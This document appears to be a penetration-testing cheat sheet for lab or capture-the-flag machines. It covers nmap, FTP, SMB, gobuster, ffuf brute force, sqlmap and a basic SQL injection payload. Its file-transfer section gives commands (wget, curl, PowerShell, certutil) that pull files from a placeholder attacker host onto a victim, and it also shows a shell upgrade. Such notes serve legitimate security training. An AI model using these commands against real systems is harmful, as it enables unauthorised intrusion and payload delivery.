
- [Port Scanning](#psc)
- [21 - FTP Port](#ftp)
- [139/445 - Samba/SMB](#smb)
- [Directory Enumeration](#dir)
- [Login BruteForce](#log)
- [Sql Injection](#si)
- [File Transfer](#ft)
- [Upgrade Shell](#us)
- [File searching](#fts)

## Port Scanning <a name='psc'></a>

### Nmap
- `-sV` shows the version of the service running on each port.
- `-sC` uses additional scripts to gather more information.
- `-p-` scans all ports. 
-  `-Pn-` Skip recognition phase.
- `-p <port>` scans only the specified port number. 
-  `-- open` only displays open ports.
- `--min-rate` Specifies the minimum number of packets Nmap should send per second; increasing this number speeds up the scan. 
```bash
nmap -sC -sV -p 21 10.129.42.253
```


## FTP Port <a name='ftp'></a>

### FTP

```bash
# anonymous login
ftp <machine-ip>
# username anonymous
# password anonymous
```

## Samba/SMB Port <a name='smb'></a>

### SmbClient 
It is a network protocol that allows users to communicate with remote computers and servers to use their resources or share, open, and edit files.

- `-U` access as user.
- `-N` No password.
- `-L` This option allows you to look at what services are available on a server.
```bash
smbclient -U bob \\\\10.129.42.253\\users
    
smbclient -N -L \\\\10.129.117.14\\
```

## Directory Enumeration <a name='dir'></a>

### Gobuster
It is a command-line tool used for performing brute-force scans or directory and subdomain enumeration on a website.
- To find subdirectories:
````bash
#wordlist example:/usr/share/wordlists/dirb/big.txt
#machine example: 10.10.192.23
gobuster dir -u <machine-ip> -w <wordlist> -o gobuster.out
````

- To find subdomains:
```bash
#wordlist example: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
#machine ip example: 10.10.192.25
gobuster vhost -w <wordlist> -u <machine-ip> -o gobuster.out
````

## Login Bruteforce <a name="log"></a>

##### ffuf

```bash
# wordlist = rockyou.txt
ffuf -u http://<machine-ip>/login-page.php -X POST -d '{"user":"FUZZ", "pass":"FUZZ"}' -w wordlist
```

## SQLInjection <a name="si"></a>
For more information consult [[SQL]].

- [SqlMap](https://sqlmap.org/)

```bash
# capture the login request with burp and save it as login.req
sqlmap -r login.req --level=5 --risk=3 --batch

# manual expoitation
> Capture the request with burp
> The entered paramaters will be url encoded, decode it with <ctrl>+<shift>+<u>
> Enter the payload " ' or 1 = 1 -- - " (simple sql injection payload)
> After changing the payload, url encode it with <ctrl>+<u>
```

## File Transfer <a name="ft"></a>

### Python3

### Impackets

```bash 
# between *nix os

# on the attacker machine
python3 -m http.server 8081

# on the victim machine
wget http://<attacker-ip>:<port>/<file>
curl http://<attacker-ip>:<port>/<file> -o <output-file>

#===========================================================#

# from linux to windows

# on the attacker machine
# creates a anonymous login
sudo smbserver.py <share-name> <linux-path> -smb2support

# on the victim machine
copy \\<attacker-ip>\<share-name>\<file> <copy-path-in-windows>
# mount the share in windows
net use x: \\<attacker-ip>\<share-name> /user:<user-name> <password>
copy x:\<file> <copy-path-in-windows>

# from external url
# sometimes fails
powershell -c (new-object System.Net.WebClient).DownloadFile('http://<attacker-ip>/<file>','<download-path-in-windows>')

# works mostly
#@alias
iwr -uri 'http://<attacker-ip>/<file>' -o '<download-path-in-windows>'
#@cmdlet
powershell.exe -command Invoke-WebRequest -Uri 'http://<attacker-ip>/<file>' -OutFile '<download-path-in-windows>'

# using certutil
certutil -urlcache -f 'http://<attacker-ip>/<file>' '<download-path-in-windows>'
```


## Upgrade Shell <a name='us'></a>

When we do a reverse shell, sometimes, we will need to upgrade our shell.

### Python
- Specifically, what it does is establish a new interactive terminal with advanced features, such as full control of function keys, command history, and the ability to use commands like Ctrl+C and Ctrl+Z. This can be useful in situations where greater interactivity is needed in a limited shell session.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# we need to *restart* to apply the changes, so we do:  
CTRL+Z  
stty raw -echo  
fg  
export TERM=xterm
```

## File searching <a name='fs'></a>

### find

Parameters:
- `-name <pattern>`: Matches files or directories with a specific name pattern.
- `-type <type>`: Matches files or directories of a specific type (e.g., `f` for regular files, `d` for directories, `l` for symbolic links).
- `-size <size>`: Matches files based on their size. For example, `+10M` matches files larger than 10 megabytes.
- `-mtime <time>`: Matches files based on their modification time. For example, `-mtime -7` matches files modified within the last 7 days.
```bash
# Use 2>/dev/null if you don't want to see errors output
find [path] [expression] 2>/dev/null
```